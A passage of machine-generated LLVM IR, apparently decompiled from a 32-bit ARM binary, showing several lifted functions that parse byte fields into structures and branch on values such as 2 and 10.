  %v0_140ac = load i32, i32* @r5, align 4
  %v1_140ac = add i32 %v0_140ac, 4
  %v2_140ac = inttoptr i32 %v1_140ac to i32*
  %v3_140ac = load i32, i32* %v2_140ac, align 4
  %v1_140b0 = trunc i32 %v3_140ac to i8
  %v2_140b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_140b0 = add i32 %v2_140b0, 1
  %v4_140b0 = inttoptr i32 %v3_140b0 to i8*
  store i8 %v1_140b0, i8* %v4_140b0, align 1
  %v0_140b4 = load i32, i32* @r5, align 4
  %v1_140b4 = add i32 %v0_140b4, 9
  %v2_140b4 = inttoptr i32 %v1_140b4 to i8*
  %v3_140b4 = load i8, i8* %v2_140b4, align 1
  %v2_140b8 = load i32, i32* %r2.global-to-local, align 4
  %v3_140b8 = add i32 %v2_140b8, 2
  %v4_140b8 = inttoptr i32 %v3_140b8 to i8*
  store i8 %v3_140b4, i8* %v4_140b8, align 1
  %v0_140bc = load i32, i32* @r5, align 4
  %v1_140bc = add i32 %v0_140bc, 8
  %v2_140bc = inttoptr i32 %v1_140bc to i32*
  %v3_140bc = load i32, i32* %v2_140bc, align 4
  %v0_140c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_140c0 = add i32 %v0_140c0, 4
  store i32 %v1_140c0, i32* %r0.global-to-local, align 4
  %v1_140c4 = trunc i32 %v3_140bc to i8
  %v2_140c4 = load i32, i32* %r2.global-to-local, align 4
  %v3_140c4 = add i32 %v2_140c4, 3
  %v4_140c4 = inttoptr i32 %v3_140c4 to i8*
  store i8 %v1_140c4, i8* %v4_140c4, align 1
  %v2_140c8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_140c8, i32* @r4, align 4
  store i32 %v6_14070, i32* @r5, align 4
  store i32 %v9_14070, i32* @r6, align 4
  ret i32 %v1_140c0

; uselistorder directives
  uselistorder i32 %v2_14084, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_14070, { 1, 0, 2 }
  uselistorder i32 %v6_14070, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @function_140cc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_140cc:
  %v0_140d0 = call i32 @function_14858()
  %v1_140d4 = icmp slt i32 %v0_140d0, 0
  br i1 %v1_140d4, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_140cc
  %v4_140d8 = add i32 %v0_140d0, 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_140cc, %bb
  %v5_140dc = phi i32 [ %v0_140d0, %dec_label_pc_140cc ], [ %v4_140d8, %bb ]
  ret i32 %v5_140dc

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_140e0(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_140e0:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_140e0 = load i32, i32* @r4, align 4
  %v6_140e0 = load i32, i32* @r5, align 4
  %v9_140e0 = load i32, i32* @r6, align 4
  %v12_140e0 = load i32, i32* @r7, align 4
  %v21_140e0 = load i32, i32* @sl, align 4
  %v2_140e4 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_140e4, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_14100 = call i32 @function_1478c()
  store i32 %v0_14100, i32* %r0.global-to-local, align 4
  store i32 %v0_14100, i32* @r7, align 4
  %v1_14104 = icmp slt i32 %v0_14100, 0
  %v0_14108 = load i32, i32* @r4, align 4
  %v2_14108 = add i32 %v0_14108, %v0_14100
  store i32 %v2_14108, i32* %r8.global-to-local, align 4
  br i1 %v1_14104, label %bb14, label %dec_label_pc_14118

dec_label_pc_14118:                               ; preds = %dec_label_pc_140e0
  %v1_14110 = load i32, i32* @r5, align 4
  %v2_14110 = sub i32 %v1_14110, %v2_14108
  %v1_14118 = add i32 %v2_14110, -10
  store i32 %v1_14118, i32* @r5, align 4
  %v6_14118 = icmp slt i32 %v1_14118, 0
  store i32 %v2_140e4, i32* %r0.global-to-local, align 4
  %v0_14120 = load i32, i32* @sl, align 4
  %v2_14120 = add i32 %v0_14120, %v2_14108
  store i32 %v2_14120, i32* @r4, align 4
  br i1 %v6_14118, label %bb, label %dec_label_pc_1412c

bb:                                               ; preds = %dec_label_pc_14118
  br label %bb14

dec_label_pc_1412c:                               ; preds = %dec_label_pc_14118
  %v1_1412c = call i32 @function_f170(i32 %v2_140e4)
  store i32 %v1_1412c, i32* %r0.global-to-local, align 4
  %v1_14130 = load i32, i32* @r6, align 4
  %v2_14130 = inttoptr i32 %v1_14130 to i32*
  store i32 %v1_1412c, i32* %v2_14130, align 4
  %v0_14134 = load i32, i32* @sl, align 4
  %v1_14134 = load i32, i32* %r8.global-to-local, align 4
  %v2_14134 = add i32 %v1_14134, %v0_14134
  %v3_14134 = inttoptr i32 %v2_14134 to i8*
  %v4_14134 = load i8, i8* %v3_14134, align 1
  %v6_14134 = zext i8 %v4_14134 to i32
  %v0_14138 = load i32, i32* @r4, align 4
  %v1_14138 = add i32 %v0_14138, 1
  %v2_14138 = inttoptr i32 %v1_14138 to i8*
  %v3_14138 = load i8, i8* %v2_14138, align 1
  %v4_14138 = zext i8 %v3_14138 to i32
  %v4_1413c = mul nuw nsw i32 %v6_14134, 256
  %v5_1413c = or i32 %v4_14138, %v4_1413c
  store i32 %v5_1413c, i32* %r3.global-to-local, align 4
  %v1_14140 = load i32, i32* @r6, align 4
  %v2_14140 = add i32 %v1_14140, 4
  %v3_14140 = inttoptr i32 %v2_14140 to i32*
  store i32 %v5_1413c, i32* %v3_14140, align 4
  %v0_14144 = load i32, i32* @r4, align 4
  %v1_14144 = add i32 %v0_14144, 2
  store i32 %v1_14144, i32* %r1.global-to-local, align 4
  %v2_14148 = inttoptr i32 %v1_14144 to i8*
  %v3_14148 = load i8, i8* %v2_14148, align 1
  %v4_14148 = zext i8 %v3_14148 to i32
  %v1_1414c = add i32 %v0_14144, 3
  %v2_1414c = inttoptr i32 %v1_1414c to i8*
  %v3_1414c = load i8, i8* %v2_1414c, align 1
  %v4_1414c = zext i8 %v3_1414c to i32
  %v4_14150 = mul nuw nsw i32 %v4_14148, 256
  %v5_14150 = or i32 %v4_1414c, %v4_14150
  store i32 %v5_14150, i32* %r3.global-to-local, align 4
  %v1_14154 = load i32, i32* @r6, align 4
  %v2_14154 = add i32 %v1_14154, 8
  %v3_14154 = inttoptr i32 %v2_14154 to i32*
  store i32 %v5_14150, i32* %v3_14154, align 4
  %v0_14158 = load i32, i32* %r1.global-to-local, align 4
  %v1_14158 = add i32 %v0_14158, 2
  %v1_1415c = add i32 %v0_14158, 3
  %v2_1415c = inttoptr i32 %v1_1415c to i8*
  %v3_1415c = load i8, i8* %v2_1415c, align 1
  %v4_1415c = zext i8 %v3_1415c to i32
  store i32 %v4_1415c, i32* %r3.global-to-local, align 4
  %v2_14160 = inttoptr i32 %v1_14158 to i8*
  %v3_14160 = load i8, i8* %v2_14160, align 1
  %v4_14160 = zext i8 %v3_14160 to i32
  store i32 %v4_14160, i32* %r0.global-to-local, align 4
  %v1_14164 = add i32 %v0_14158, 5
  %v2_14164 = inttoptr i32 %v1_14164 to i8*
  %v3_14164 = load i8, i8* %v2_14164, align 1
  %v4_14164 = zext i8 %v3_14164 to i32
  %v3_14168 = mul nuw nsw i32 %v4_1415c, 65536
  store i32 %v3_14168, i32* %r3.global-to-local, align 4
  %v1_1416c = add i32 %v0_14158, 4
  %v2_1416c = inttoptr i32 %v1_1416c to i8*
  %v3_1416c = load i8, i8* %v2_1416c, align 1
  %v4_1416c = zext i8 %v3_1416c to i32
  %v4_14170 = mul nuw i32 %v4_14160, 16777216
  %v5_14170 = or i32 %v4_14170, %v3_14168
  %v2_14174 = or i32 %v5_14170, %v4_14164
  %v4_14178 = mul nuw nsw i32 %v4_1416c, 256
  %v5_14178 = or i32 %v2_14174, %v4_14178
  store i32 %v5_14178, i32* %r3.global-to-local, align 4
  %v1_1417c = load i32, i32* @r6, align 4
  %v2_1417c = add i32 %v1_1417c, 12
  %v3_1417c = inttoptr i32 %v2_1417c to i32*
  store i32 %v5_14178, i32* %v3_1417c, align 4
  %v0_14180 = load i32, i32* %r1.global-to-local, align 4
  %v1_14180 = add i32 %v0_14180, 6
  %v2_14180 = inttoptr i32 %v1_14180 to i8*
  %v3_14180 = load i8, i8* %v2_14180, align 1
  %v4_14180 = zext i8 %v3_14180 to i32
  %v0_14184 = load i32, i32* @r4, align 4
  %v1_14184 = add i32 %v0_14184, 9
  %v2_14184 = inttoptr i32 %v1_14184 to i8*
  %v3_14184 = load i8, i8* %v2_14184, align 1
  %v4_14184 = zext i8 %v3_14184 to i32
  %v1_14188 = add i32 %v0_14184, 10
  store i32 %v1_14188, i32* %r0.global-to-local, align 4
  %v4_1418c = mul nuw nsw i32 %v4_14180, 256
  %v5_1418c = or i32 %v4_14184, %v4_1418c
  store i32 %v5_1418c, i32* %r3.global-to-local, align 4
  %v0_14190 = load i32, i32* %r8.global-to-local, align 4
  %v1_14190 = add i32 %v0_14190, 10
  %v0_14194 = load i32, i32* @r5, align 4
  %v1_14198 = add nuw nsw i32 %v5_1418c, 10
  store i32 %v1_14198, i32* %r1.global-to-local, align 4
  %v1_1419c = load i32, i32* @r6, align 4
  %v2_1419c = add i32 %v1_1419c, 24
  %v3_1419c = inttoptr i32 %v2_1419c to i32*
  store i32 %v1_14190, i32* %v3_1419c, align 4
  %v0_141a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_141a0 = load i32, i32* @r6, align 4
  %v2_141a0 = add i32 %v1_141a0, 20
  %v3_141a0 = inttoptr i32 %v2_141a0 to i32*
  store i32 %v0_141a0, i32* %v3_141a0, align 4
  %v0_141a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_141a4 = load i32, i32* @r6, align 4
  %v2_141a4 = add i32 %v1_141a4, 16
  %v3_141a4 = inttoptr i32 %v2_141a4 to i32*
  store i32 %v0_141a4, i32* %v3_141a4, align 4
  %v0_141a8 = load i32, i32* @r7, align 4
  %v1_141a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_141a8 = add i32 %v1_141a8, %v0_141a8
  %v5_141ac = icmp slt i32 %v0_14194, %v5_1418c
  %.v2_141a8 = select i1 %v5_141ac, i32 -1, i32 %v2_141a8
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_1412c, %dec_label_pc_140e0
  %v0_141b0 = phi i32 [ %.v2_141a8, %dec_label_pc_1412c ], [ %v1_14118, %bb ], [ %v0_14100, %dec_label_pc_140e0 ]
  store i32 %v0_141b0, i32* %r0.global-to-local, align 4
  store i32 %v3_140e0, i32* @r4, align 4
  store i32 %v6_140e0, i32* @r5, align 4
  store i32 %v9_140e0, i32* @r6, align 4
  store i32 %v12_140e0, i32* @r7, align 4
  store i32 %v21_140e0, i32* @sl, align 4
  ret i32 %v0_141b0

; uselistorder directives
  uselistorder i32 %v0_141b0, { 1, 0 }
  uselistorder i32 %v5_1418c, { 1, 0, 2 }
  uselistorder i32 %v3_14168, { 1, 0 }
  uselistorder i32 %v1_14118, { 0, 2, 1 }
  uselistorder i32 %v0_14100, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 0 }
  uselistorder i32 20, { 21, 22, 23, 24, 0, 25, 34, 3, 35, 1, 4, 26, 7, 27, 28, 16, 8, 18, 2, 9, 29, 30, 31, 32, 17, 33, 10, 19, 11, 6, 5, 12, 20, 13, 14, 15 }
  uselistorder i32 24, { 4, 5, 6, 7, 12, 0, 8, 9, 10, 13, 2, 22, 1, 11, 14, 15, 16, 17, 18, 19, 3, 20, 21 }
  uselistorder i32 9, { 6, 7, 8, 9, 10, 0, 11, 1, 12, 13, 2, 14, 4, 15, 16, 17, 18, 3, 5 }
  uselistorder i32 6, { 11, 12, 13, 7, 8, 14, 15, 1, 2, 3, 17, 4, 5, 16, 0, 6, 9, 10 }
  uselistorder i32 5, { 1, 13, 14, 15, 8, 4, 2, 9, 3, 0, 16, 17, 5, 10, 11, 12, 6, 7 }
  uselistorder i32 (i32)* @function_f170, { 2, 1, 0, 3 }
  uselistorder i32 -10, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @function_141bc() local_unnamed_addr {
dec_label_pc_141bc:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_16ff0.573 to i32), i32* @r1, align 4
  %v0_141c0 = load i32, i32* @lr, align 4
  store i32 %v0_141c0, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_17054.607 to i32), i32* @r0, align 4
  %v3_141c8 = call i32 @function_cd94(i32 ptrtoint ([11 x i8]* @global_var_17054.607 to i32), i32 ptrtoint (i32* @global_var_16ff0.573 to i32))
  %v2_141cc = icmp eq i32 %v3_141c8, 0
  store i32 ptrtoint (i32* @global_var_16ff0.573 to i32), i32* @r1, align 4
  br i1 %v2_141cc, label %bb2, label %bb

bb:                                               ; preds = %dec_label_pc_141bc
  ret i32 %v3_141c8

bb2:                                              ; preds = %dec_label_pc_141bc
  store i32 ptrtoint ([18 x i8]* @global_var_17060.609 to i32), i32* @r0, align 4
  %v2_141dc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_141dc, i32* @lr, align 4
  %v3_141e0 = call i32 @function_cd94(i32 ptrtoint ([18 x i8]* @global_var_17060.609 to i32), i32 ptrtoint (i32* @global_var_16ff0.573 to i32))
  ret i32 %v3_141e0

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_cd94, { 5, 3, 2, 1, 0, 4 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_16ff0.573 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @function_141f0() local_unnamed_addr {
dec_label_pc_141f0:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_141f0 = load i32, i32* @r4, align 4
  %v6_141f0 = load i32, i32* @r5, align 4
  %v12_141f0 = load i32, i32* @r7, align 4
  %v15_141f0 = load i32, i32* @r8, align 4
  %v21_141f0 = load i32, i32* @sl, align 4
  %v24_141f0 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_141fc = sub i32 0, %tmp61
  %v1_14200 = urem i32 %v1_141fc, 4
  store i32 %v1_14200, i32* %ip.global-to-local, align 4
  %v2_14200 = icmp eq i32 %v1_14200, 0
  %v0_14204 = load i32, i32* @r2, align 4
  %v0_14208 = load i32, i32* @r0, align 4
  %v0_1420c = load i32, i32* @r1, align 4
  %v0_14210 = load i32, i32* @r3, align 4
  store i32 %v0_14210, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_14200, label %dec_label_pc_14230, label %dec_label_pc_14220

dec_label_pc_14220:                               ; preds = %dec_label_pc_141f0
  %v2_14220 = sub i32 %tmp57, %v1_14200
  %v3_14220 = icmp ult i32 %tmp57, %v1_14200
  br i1 %v3_14220, label %dec_label_pc_14504, label %dec_label_pc_14228

dec_label_pc_14228:                               ; preds = %dec_label_pc_14220
  store i32 %v2_14220, i32* %r2.global-to-local, align 4
  %v2_1422c = add i32 %v1_14200, %tmp61
  store i32 %v2_1422c, i32* @r4, align 4
  br label %dec_label_pc_14230

dec_label_pc_14230:                               ; preds = %dec_label_pc_141f0, %dec_label_pc_14228
  %v0_14240 = phi i32 [ %tmp61, %dec_label_pc_141f0 ], [ %v2_1422c, %dec_label_pc_14228 ]
  %v0_14244 = phi i32 [ %tmp57, %dec_label_pc_141f0 ], [ %v2_14220, %dec_label_pc_14228 ]
  %tmp = icmp ult i32 %v0_14244, 32
  br i1 %tmp, label %dec_label_pc_14504, label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %dec_label_pc_14230
  store i32 %v0_14210, i32* %r0.global-to-local, align 4
  %v7_1423c = icmp eq i32 %v0_14210, 1
  %v1_14240 = add i32 %v0_14240, 32
  store i32 %v1_14240, i32* @fp, align 4
  %v1_14244 = add i32 %v0_14244, -32
  store i32 %v1_14244, i32* @r8, align 4
  br i1 %v7_1423c, label %dec_label_pc_14370, label %dec_label_pc_1424c

dec_label_pc_1424c:                               ; preds = %dec_label_pc_14238
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_14258 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_14258, align 4
  %tmp80 = icmp ult i32 %v1_14244, 4
  br i1 %tmp80, label %dec_label_pc_14504, label %dec_label_pc_14260

dec_label_pc_14260:                               ; preds = %dec_label_pc_1424c
  %v0_14260 = load i32, i32* %r2.global-to-local, align 4
  %v1_14260 = add i32 %v0_14260, -36
  store i32 %v1_14260, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_14260, 8
  br i1 %tmp81, label %dec_label_pc_14504, label %dec_label_pc_1426c

dec_label_pc_1426c:                               ; preds = %dec_label_pc_14260
  %v0_1426c = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_1426c, 16
  br i1 %tmp82, label %dec_label_pc_14504, label %dec_label_pc_14274

dec_label_pc_14274:                               ; preds = %dec_label_pc_1426c
  %v1_14274 = add i32 %v0_14260, -48
  store i32 %v1_14274, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_14274, 8
  br i1 %tmp83, label %dec_label_pc_14504, label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14274
  %v1_14280 = add i32 %v0_14260, -44
  store i32 %v1_14280, i32* @r8, align 4
  %v1_14284 = add i32 %v0_14260, -56
  store i32 %v1_14284, i32* %r3.global-to-local, align 4
  %v3_14288 = icmp ult i32 %v1_14284, %v1_14280
  br i1 %v3_14288, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_14280
  %v1_14290 = load i32, i32* @r4, align 4
  %v2_14290 = add i32 %v1_14290, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_14280
  store i32 %v1_14284, i32* @r8, align 4
  %v1_14294.pre = load i32, i32* @r4, align 4
  %v2_14294 = add i32 %v1_14294.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_14294, %.thread1 ], [ %v2_14290, %bb ]
  %v0_1429c = phi i32 [ %v1_14294.pre, %.thread1 ], [ %v1_14290, %bb ]
  %v0_14298 = phi i32 [ %v1_14284, %.thread1 ], [ %v1_14280, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_1429c = add i32 %v0_1429c, 36
  store i32 %v1_1429c, i32* @r6, align 4
  %v1_142a0 = add i32 %v0_1429c, 48
  store i32 %v1_142a0, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_14298, 80
  br i1 %tmp84, label %dec_label_pc_14504, label %dec_label_pc_142a8

dec_label_pc_142a8:                               ; preds = %bb74
  %v0_142a8 = call i32 @function_141bc()
  store i32 %v0_142a8, i32* %r0.global-to-local, align 4
  %v2_142ac = icmp eq i32 %v0_142a8, 0
  br i1 %v2_142ac, label %dec_label_pc_142c8, label %.thread

.thread:                                          ; preds = %dec_label_pc_142a8
  %v1_142b4 = load i32, i32* @fp, align 4
  store i32 %v1_142b4, i32* @r7, align 4
  %v1_142b8 = load i32, i32* @r5, align 4
  store i32 %v1_142b8, i32* @fp, align 4
  %v1_142bc = load i32, i32* @r6, align 4
  %v1_142c0 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1437c

dec_label_pc_142c8:                               ; preds = %dec_label_pc_142a8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_142d0 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_142d0, align 4
  %v0_142d4 = call i32 @function_cc08()
  store i32 %v0_142d4, i32* %r0.global-to-local, align 4
  %v1_142d8 = inttoptr i32 %v0_142d4 to i32*
  %v2_142d8 = load i32, i32* %v1_142d8, align 4
  store i32 %v2_142d8, i32* @sl, align 4
  br label %dec_label_pc_14508

dec_label_pc_142e0:                               ; preds = %dec_label_pc_14490
  %v0_142e0 = load i32, i32* @r4, align 4
  %v1_142e0 = add i32 %v0_142e0, 4
  %v2_142e0 = inttoptr i32 %v1_142e0 to i32*
  %v3_142e0 = load i32, i32* %v2_142e0, align 4
  %v1_142e4 = load i32, i32* @sb, align 4
  %v2_142e4 = inttoptr i32 %v1_142e4 to i32*
  store i32 %v3_142e0, i32* %v2_142e4, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_142f8 = load i32, i32* @r4, align 4
  %v1_142f8 = add i32 %v0_142f8, 8
  store i32 %v1_142f8, i32* %r1.global-to-local, align 4
  %v1_142fc = load i32, i32* @sb, align 4
  %v2_142fc = add i32 %v1_142fc, 8
  %v3_142fc = inttoptr i32 %v2_142fc to i32*
  store i32 2, i32* %v3_142fc, align 4
  %v0_14300 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_14300, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_14308 = load i32, i32* @sb, align 4
  %v1_14308 = load i32, i32* %ip.global-to-local, align 4
  %v2_14308 = inttoptr i32 %v1_14308 to i32*
  store i32 %v0_14308, i32* %v2_14308, align 4
  %v0_1430c = load i32, i32* @r7, align 4
  %v1_1430c = load i32, i32* %r0.global-to-local, align 4
  %v2_1430c = inttoptr i32 %v1_1430c to i32*
  store i32 %v0_1430c, i32* %v2_1430c, align 4
  %v0_14310 = load i32, i32* %r3.global-to-local, align 4
  %v1_14310 = load i32, i32* @sb, align 4
  %v2_14310 = add i32 %v1_14310, 12
  %v3_14310 = inttoptr i32 %v2_14310 to i32*
  store i32 %v0_14310, i32* %v3_14310, align 4
  %v0_14314 = load i32, i32* %r0.global-to-local, align 4
  %v1_14314 = load i32, i32* @sb, align 4
  %v2_14314 = add i32 %v1_14314, 16
  %v3_14314 = inttoptr i32 %v2_14314 to i32*
  store i32 %v0_14314, i32* %v3_14314, align 4
  %v0_14318 = load i32, i32* %r1.global-to-local, align 4
  %v1_14318 = load i32, i32* @sb, align 4
  %v2_14318 = add i32 %v1_14318, 4
  %v3_14318 = inttoptr i32 %v2_14318 to i32*
  store i32 %v0_14318, i32* %v3_14318, align 4
  %v0_1431c = load i32, i32* %r2.global-to-local, align 4
  %v1_1431c = load i32, i32* %r0.global-to-local, align 4
  %v2_1431c = add i32 %v1_1431c, 4
  %v3_1431c = inttoptr i32 %v2_1431c to i32*
  store i32 %v0_1431c, i32* %v3_1431c, align 4
  br label %dec_label_pc_144ec

dec_label_pc_14324:                               ; preds = %dec_label_pc_144b8
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_14328 = load i32, i32* @r4, align 4
  %v1_14328 = add i32 %v0_14328, 4
  %v2_14328 = inttoptr i32 %v1_14328 to i32*
  %v3_14328 = load i32, i32* %v2_14328, align 4
  store i32 %v3_14328, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_14330 = load i32, i32* @sb, align 4
  %v2_14330 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_14330, i32* %v2_14330, align 4
  store i32 %v0_14388, i32* %ip.global-to-local, align 4
  %v0_14338 = load i32, i32* %r3.global-to-local, align 4
  %v1_14338 = load i32, i32* @sb, align 4
  %v2_14338 = inttoptr i32 %v1_14338 to i32*
  store i32 %v0_14338, i32* %v2_14338, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_14344 = load i32, i32* %ip.global-to-local, align 4
  %v1_14344 = load i32, i32* %r0.global-to-local, align 4
  %v2_14344 = inttoptr i32 %v1_14344 to i32*
  store i32 %v0_14344, i32* %v2_14344, align 4
  %v0_14348 = load i32, i32* %r3.global-to-local, align 4
  %v1_14348 = load i32, i32* @sb, align 4
  %v2_14348 = add i32 %v1_14348, 12
  %v3_14348 = inttoptr i32 %v2_14348 to i32*
  store i32 %v0_14348, i32* %v3_14348, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_14354 = load i32, i32* @r4, align 4
  %v1_14354 = add i32 %v0_14354, 8
  store i32 %v1_14354, i32* %r1.global-to-local, align 4
  %v0_14358 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_14358, i32* @sl, align 4
  %v1_1435c = load i32, i32* @sb, align 4
  %v2_1435c = add i32 %v1_1435c, 8
  %v3_1435c = inttoptr i32 %v2_1435c to i32*
  store i32 10, i32* %v3_1435c, align 4
  %v0_14360 = load i32, i32* %r3.global-to-local, align 4
  %v1_14360 = load i32, i32* @sb, align 4
  %v2_14360 = add i32 %v1_14360, 16
  %v3_14360 = inttoptr i32 %v2_14360 to i32*
  store i32 %v0_14360, i32* %v3_14360, align 4
  %v0_14364 = load i32, i32* %r1.global-to-local, align 4
  %v1_14364 = load i32, i32* @sb, align 4
  %v2_14364 = add i32 %v1_14364, 4
  %v3_14364 = inttoptr i32 %v2_14364 to i32*
  store i32 %v0_14364, i32* %v3_14364, align 4
  %v0_14368 = load i32, i32* %r2.global-to-local, align 4
  %v1_14368 = load i32, i32* %r3.global-to-local, align 4
  %v2_14368 = add i32 %v1_14368, 4
  %v3_14368 = inttoptr i32 %v2_14368 to i32*
  store i32 %v0_14368, i32* %v3_14368, align 4
  br label %dec_label_pc_144ec

dec_label_pc_14370:                               ; preds = %dec_label_pc_14238
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_1437c

dec_label_pc_1437c:                               ; preds = %.thread, %dec_label_pc_14370
  %v2_1438c.pre-phi = phi i32* [ %v2_14258, %.thread ], [ %.pre, %dec_label_pc_14370 ]
  %v0_14388 = phi i32 [ %v1_142b4, %.thread ], [ 0, %dec_label_pc_14370 ]
  %stack_var_-40.1 = phi i32 [ %v1_142c0, %.thread ], [ 0, %dec_label_pc_14370 ]
  %stack_var_-48.1 = phi i32 [ %v1_142bc, %.thread ], [ 0, %dec_label_pc_14370 ]
  %stack_var_-52.0 = phi i32 [ %v0_142a8, %.thread ], [ %v0_14208, %dec_label_pc_14370 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_1438c.pre-phi, align 4
  %v2_14450 = inttoptr i32 %v0_1420c to i8*
  %v7_14488 = icmp eq i32 %v0_14204, 2
  %v7_144b0 = icmp eq i32 %v0_14204, 10
  br label %dec_label_pc_144d4

dec_label_pc_14394:                               ; preds = %dec_label_pc_144d4
  %v0_14394 = load i32, i32* @fp, align 4
  store i32 %v0_14394, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_1439c = call i32 @function_145dc(i32 %v0_14394, i32 35)
  store i32 %v2_1439c, i32* %r0.global-to-local, align 4
  %v3_143a0 = icmp eq i32 %v2_1439c, 0
  br i1 %v3_143a0, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_14394
  %v0_143a811 = load i32, i32* @fp, align 4
  store i32 %v0_143a811, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_14414.preheader

bb75:                                             ; preds = %dec_label_pc_14394
  %v3_1439c = inttoptr i32 %v2_1439c to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_143a8 = load i32, i32* @fp, align 4
  store i32 %v0_143a8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_1439c, align 1
  %v0_1441430.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14414.preheader

dec_label_pc_14414.preheader:                     ; preds = %bb75, %.thread10
  %v0_1441430 = phi i32 [ %v0_1441430.pre, %bb75 ], [ %v0_143a811, %.thread10 ]
  %v1_1441431 = inttoptr i32 %v0_1441430 to i8*
  %v2_1441432 = load i8, i8* %v1_1441431, align 1
  %v3_1441433 = zext i8 %v2_1441432 to i32
  store i32 %v3_1441433, i32* %r3.global-to-local, align 4
  %v2_1441834 = icmp eq i8 %v2_1441432, 0
  br i1 %v2_1441834, label %dec_label_pc_14420, label %dec_label_pc_143c0.preheader

dec_label_pc_143b8:                               ; preds = %dec_label_pc_143cc
